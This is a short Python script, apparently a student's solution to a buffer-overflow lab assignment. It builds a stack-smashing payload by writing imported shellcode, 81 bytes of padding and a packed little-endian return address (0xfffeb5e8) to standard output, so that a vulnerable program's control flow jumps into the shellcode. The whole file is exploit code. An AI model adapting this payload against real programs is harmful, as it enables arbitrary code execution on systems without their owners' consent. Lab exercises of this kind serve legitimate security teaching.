#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"0"*81)
sys.stdout.buffer.write(pack("<I",0xfffeb5e8))
